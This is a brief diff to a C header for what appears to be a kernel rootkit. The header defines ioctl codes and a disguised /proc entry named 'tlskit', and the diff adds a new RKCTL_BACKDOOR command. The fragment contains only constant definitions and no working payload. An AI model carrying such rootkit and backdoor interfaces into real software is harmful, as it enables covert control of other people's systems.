@@ -12,6 +12,7 @@
  */
 #define RKCTL_PING      _IO('@', 0x01)
 #define RKCTL_UNLOAD    _IO('@', 0x02)
+#define RKCTL_BACKDOOR  _IO('@', 0x03)
 
 #define PROC_ENTRY_NAME "tlskit"
 #define IOCTL_FILE_PATH "/proc/tlskit"
